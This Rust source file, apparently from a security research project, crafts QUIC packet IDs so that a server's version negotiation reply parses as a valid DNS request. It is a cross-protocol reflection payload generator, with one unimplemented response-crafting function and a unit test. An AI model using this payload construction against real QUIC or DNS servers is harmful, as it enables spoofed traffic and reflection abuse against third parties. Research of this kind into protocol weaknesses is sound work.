use std::net::{IpAddr, SocketAddr};

use color_eyre::eyre::Result;

use crate::payload::Payload;

/// Number of versions the server supports.
const DEFAULT_SUPPORTED_VERSION_COUNT: usize = 7;

/// Create a payload such that the resulting version negotiation
/// packet is a valid DNS (request) packet.
///
/// The length of the scid in our payload plays the role of the number of queries.
///
/// We have the following packet layout:
/// - Flags + Version[0]: DNS packet ID
/// - Version[1..3]: DNS flags
/// - Version[4] + `scid_len`: Number of queries (7)
/// - SCID[0..2]: Number of Ans (0)
/// - SCID[2..4]: Number of Auth (0)
/// - SCID[4..6]: Number of Add (1)
/// - SCID[7]: First byte of first question/query
/// - `dcid_len` + DCID: rest of queries
///
/// We have (more or less) full control over the SCID and DCID, including their lengths
/// 
/// The version is equal to 0 for version negotiation packet, which (luckily) is consistent with a
/// valid DNS packet.
///
/// Note: These are the SCID and DCID of the packet we send to the server, in the response the
/// roles are reversed, i.e. the SCID becomes the DCID.
pub fn craft_dns_request_payload(hostname: &str) -> Result<Payload> {
    let labels: Vec<&[u8]> = hostname
        .split(".")
        .map(str::as_bytes)
        .collect();

    // Craft SCID
    let scid: Vec<u8> = vec![0, 0, 0, 0, 0, 1, labels[0].len().try_into()?];

    // Craft DCID
    let dcid_len: u8 = labels[0][0];
    let mut dcid = labels[0][1..].to_vec();

    // Add first domain name
    for label in &labels[1..] {
        // Each label is preceded by its length
        dcid.push(label.len().try_into()?);
        dcid.extend(*label);
    }

    // Top level domain is terminated by zero-byte.
    dcid.extend(b"\x00");
    // Remaining 2 fields of the question.
    dcid.extend(b"\x00\x01\x00\x01");

    // Add remaininag 6 questions
    dcid.extend(b"\x00\x00\x01\x00\x01".repeat(6));

    // Add start of additional resource record.
    // Covers NAME(1) + TYPE(2) + CLASS(3) + TTL(4) + RDLENGTH[0](1) ( = 10 bytes )
    dcid.extend(b"\x00".repeat(10));

    // We got a problem if this is false.
    assert!(dcid.len() < dcid_len as usize);

    // Calculate the remaining size of the QUIC packet.
    // Includes remaining DCID space and the supported version ids from the server.
    // One byte is subtracted for adding the length itself.
    let remaining_len = (dcid_len as usize) - dcid.len() + DEFAULT_SUPPORTED_VERSION_COUNT * 4 - 1;

    // RDLENGTH[1]
    dcid.push(remaining_len.try_into()?);
    // Fill RDATA with random garbage.
    for i in dcid.len()..(dcid_len as usize) {
        dcid.push(i as u8);
    }

    Ok(Payload::Vnrf {
        scid,
        dcid,
        // Doesn't matter what we specify as long as it's unsupported by the server.
        version: 0x1337_1337,
    })
}

pub fn craft_almost_dns_response_payload(hostname: &str, target: SocketAddr) -> Result<Payload> {
    unimplemented!()
}

#[cfg(test)]
mod tests {
    use super::*;
    use color_eyre::eyre::Result;

    #[test]
    fn crafting_dns() -> Result<()> {
        if let Payload::Vnrf {
            scid,
            dcid,
            version,
        } = craft_dns_request_payload("tu-berlin.de")? {

            let expected_scid: Vec<u8> = vec![0, 0, 0, 0, 0, 1, "tu-berlin".len().try_into()?];

            assert_eq!(scid, expected_scid);
        }

        Ok(())
    }
}
